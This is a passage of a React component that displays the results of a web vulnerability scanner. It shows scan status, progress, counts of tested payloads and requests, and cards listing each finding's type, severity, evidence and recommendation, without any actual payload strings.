                      <CardHeader className="pb-3">
                        <div className="flex items-center justify-between">
                          <div>
                            <CardTitle className="text-lg">{scan.url}</CardTitle>
                            <div className="flex items-center gap-2 mt-1">
                              <Badge
                                variant="secondary"
                                className={
                                  scan.status === "completed"
                                    ? "bg-primary text-primary-foreground"
                                    : scan.status === "scanning"
                                      ? "bg-accent text-accent-foreground"
                                      : "bg-destructive text-destructive-foreground"
                                }
                              >
                                {scan.status === "completed" && <CheckCircle className="h-3 w-3 mr-1" />}
                                {scan.status === "scanning" && <Play className="h-3 w-3 mr-1" />}
                                {scan.status === "error" && <AlertTriangle className="h-3 w-3 mr-1" />}
                                {scan.status.charAt(0).toUpperCase() + scan.status.slice(1)}
                              </Badge>
                              <span className="text-sm text-muted-foreground">
                                Started: {scan.startTime.toLocaleTimeString()}
                              </span>
                            </div>
                          </div>
                          <div className="text-right">
                            <p className="text-sm text-muted-foreground">Vulnerabilities Found</p>
                            <p className="text-2xl font-bold text-destructive">{scan.vulnerabilities.length}</p>
                          </div>
                        </div>
                      </CardHeader>

                      <CardContent className="space-y-4">
                        {scan.status === "scanning" && (
                          <div className="space-y-2">
                            <div className="flex justify-between text-sm">
                              <span>Scanning Progress</span>
                              <span>{Math.round(scan.progress)}%</span>
                            </div>
                            <Progress value={scan.progress} className="h-2" />
                            <div className="text-xs text-muted-foreground">
                              Tested {scan.testedPayloads} payloads • {scan.totalRequests} requests made
                            </div>
                          </div>
                        )}

                        {scan.vulnerabilities.length > 0 && (
                          <div className="space-y-3">
                            {scan.vulnerabilities.map((vuln) => (
                              <Card key={vuln.id} className="border-l-4 border-l-destructive">
                                <CardContent className="p-4">
                                  <div className="flex items-start justify-between mb-2">
                                    <div className="flex items-center gap-2">
                                      {getVulnerabilityIcon(vuln.type)}
                                      <span className="font-medium">{vuln.type.replace("_", " ")}</span>
                                      {vuln.cwe && (
                                        <Badge variant="outline" className="text-xs">
                                          {vuln.cwe}
                                        </Badge>
                                      )}
                                    </div>
                                    <Badge className={getSeverityColor(vuln.severity)}>{vuln.severity}</Badge>
                                  </div>
                                  <p className="text-sm mb-2">{vuln.description}</p>
                                  <p className="text-xs text-muted-foreground mb-2">URL: {vuln.url}</p>
                                  {vuln.payload && (
                                    <div className="bg-muted p-2 rounded text-xs font-mono mb-2">
                                      <strong>Payload:</strong> {vuln.payload}
                                    </div>
                                  )}
                                  {vuln.evidence && (
                                    <div className="bg-muted p-2 rounded text-xs font-mono mb-2">
                                      <strong>Evidence:</strong> {vuln.evidence}
                                    </div>
                                  )}
                                  <div className="bg-primary/10 p-2 rounded text-xs">
                                    <strong>Recommendation:</strong> {vuln.recommendation}
                                  </div>
                                </CardContent>
                              </Card>
                            ))}
                          </div>
                        )}

                        {scan.status === "completed" && (
                          <div className="space-y-2 text-sm border-t pt-4">
                            <div className="flex justify-between">
                              <span>Scan Duration:</span>
                              <span>
                                {scan.endTime
                                  ? `${Math.round((scan.endTime.getTime() - scan.startTime.getTime()) / 1000)}s`
                                  : "In progress..."}
                              </span>
                            </div>
                            <div className="flex justify-between">
                              <span>Payloads Tested:</span>
                              <span>{scan.testedPayloads}</span>
                            </div>
                            <div className="flex justify-between">
                              <span>Total Requests:</span>
                              <span>{scan.totalRequests}</span>
                            </div>
                          </div>
                        )}
                      </CardContent>
                    </Card>
                  ))}
                </div>
              </ScrollArea>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  )
}
